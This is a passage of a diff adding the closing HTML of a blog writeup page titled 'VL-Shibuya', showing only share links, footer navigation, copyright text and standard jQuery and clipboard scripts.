+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/10/VL-Shibuya/&is_video=false&description=VL-Shibuya"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Shibuya&body=Check out this article: http://example.com/2025/04/10/VL-Shibuya/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/10/VL-Shibuya/&name=VL-Shibuya&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/10/VL-Shibuya/&t=VL-Shibuya"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
